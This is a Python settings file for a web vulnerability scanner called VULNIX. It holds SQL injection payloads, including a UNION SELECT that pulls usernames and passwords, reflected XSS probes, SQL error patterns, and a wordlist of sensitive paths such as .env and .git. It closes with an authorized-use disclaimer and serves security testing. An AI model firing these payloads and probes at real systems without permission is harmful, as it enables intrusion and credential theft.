"""
VULNIX - Configuration Settings
"""

from typing import Dict, List
from dataclasses import dataclass, field


@dataclass
class ScanConfig:
    """Scan configuration."""

    max_depth: int = 3
    max_urls: int = 100
    timeout: int = 30
    max_retries: int = 3
    delay: float = 0.5
    follow_redirects: bool = True
    verify_ssl: bool = True
    user_agent_rotation: bool = True
    concurrent_requests: int = 5


@dataclass
class VulnerabilityConfig:
    """Vulnerability detection configuration."""

    enable_sqli: bool = True
    enable_xss: bool = True
    enable_headers: bool = True
    enable_dirscan: bool = False
    enable_csrf: bool = False
    enable_idor: bool = False
    enable_auth: bool = False
    enable_http_desync: bool = False
    enable_cloud_metadata: bool = False
    enable_waf_detection: bool = False
    enable_waf_bypass: bool = False
    enable_websocket: bool = False
    enable_cve_intel: bool = False
    cve_intel_offline: bool = False


@dataclass
class BugBountyConfig:
    """Bug bounty specific configuration."""

    quick_scan: bool = False
    subdomain_enum: bool = False
    subdomain_bruteforce: bool = False
    parameter_fuzz: bool = False
    cors_check: bool = False
    jwt_check: bool = False
    ssrf_check: bool = False
    redirect_check: bool = False
    method_tampering: bool = False
    port_scan: bool = False
    technology_fingerprint: bool = False


@dataclass
class StealthConfig:
    """Stealth mode configuration."""

    rate_limit: int = 10
    delay: float = 0.5
    random_delay: bool = False
    user_agent_rotation: bool = True
    respect_robots: bool = False


@dataclass
class CVSSConfig:
    """CVSS scoring configuration."""

    critical_threshold: float = 9.0
    high_threshold: float = 7.0
    medium_threshold: float = 4.0
    low_threshold: float = 0.1

    cvss_to_severity: Dict[str, str] = field(
        default_factory=lambda: {
            "CRITICAL": "critical",
            "HIGH": "high",
            "MEDIUM": "medium",
            "LOW": "low",
            "INFO": "info",
        }
    )

    def get_severity(self, cvss_score: float) -> str:
        """Convert CVSS score to severity level."""
        if cvss_score >= self.critical_threshold:
            return "critical"
        elif cvss_score >= self.high_threshold:
            return "high"
        elif cvss_score >= self.medium_threshold:
            return "medium"
        elif cvss_score >= self.low_threshold:
            return "low"
        else:
            return "info"

    def calculate_cvss(self, base_score: float, vector: str) -> float:
        """Calculate CVSS score."""
        return base_score


@dataclass
class SeverityConfig:
    """Severity level mappings."""

    levels: Dict[str, str] = field(
        default_factory=lambda: {
            "CRITICAL": "critical",
            "HIGH": "high",
            "MEDIUM": "medium",
            "LOW": "low",
            "INFO": "info",
        }
    )


class PAYLOADS:
    """SQL Injection Payloads."""

    SQLI = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        '" OR "1"="1',
        '" OR "1"="1" --',
        "' OR ''='",
        "' OR 1=1--",
        "' OR a=a--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "admin' --",
        "admin' #",
        "' OR 1=1 --",
        "1=1",
        "' OR 'a'='a",
    ]

    SQLI_ERROR_PATTERNS = [
        r"SQL syntax",
        r"MySQL",
        r"ysql",
        r"SQLite/JDBC",
        r"PostgreSQL",
        r"Microsoft SQL Server",
        r"ODBC",
        r"ORA-\d+",
        r"ORA-\d{5}",
        r"SQL error",
        r"Warning.*mysql",
        r"mysql_fetch",
        r"Unterminated",
        r"syntax error",
        r"SQLite error",
    ]


class XSS_PAYLOADS:
    """XSS Payloads."""

    REFLECTED = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        '<input autofocus onfocus=alert(1)>',
        "<select onfocus=alert(1) autofocus>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video><source onerror='alert(1)'>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
    ]


class SECURITY_HEADERS:
    """Required security headers."""

    REQUIRED = [
        "Content-Security-Policy",
        "X-Frame-Options",
        "Strict-Transport-Security",
        "X-Content-Type-Options",
    ]

    RECOMMENDED = [
        "Content-Security-Policy",
        "X-Frame-Options",
        "Strict-Transport-Security",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
    ]


DEFAULT_WORDLIST = [
    "admin",
    "administrator",
    "login",
    "admin.php",
    "admin.html",
    "login.php",
    "dashboard",
    "cpanel",
    "phpmyadmin",
    "mysql",
    "sql",
    "database",
    "config",
    "backup",
    "backup.tar.gz",
    "backup.zip",
    "dump",
    "db",
    "data",
    "upload",
    "uploads",
    "file",
    "files",
    "images",
    "img",
    "api",
    "ws",
    "rest",
    "graphql",
    "graphiql",
    "console",
    "debug",
    "test",
    "dev",
    "staging",
    "wp-admin",
    "wp-content",
    "wp-includes",
    "wordpress",
    "joomla",
    "drupal",
    "magento",
    "shop",
    "cart",
    "checkout",
    "order",
    "user",
    "users",
    "profile",
    "account",
    "settings",
    "config",
    "configuration",
    ".git",
    ".svn",
    ".env",
    ".htaccess",
    "server-status",
    "server-info",
    "info",
    "phpinfo",
    "phpinfo.php",
    "status",
    "health",
    "metrics",
    "actuator",
]


DISCLAIMER = "WARNING: This tool is intended exclusively for security testing on web applications that you have explicit permission to test. Unauthorized use is illegal."


DISCLAIMER_FULL = """
VULNIX - Web Vulnerability Scanner

WARNING:
This tool is intended exclusively for security testing on web applications
that you have explicit permission to test. Unauthorized use is illegal.

Use only on systems you own or have written authorization to test.
Unauthorized access is a criminal offense.
"""
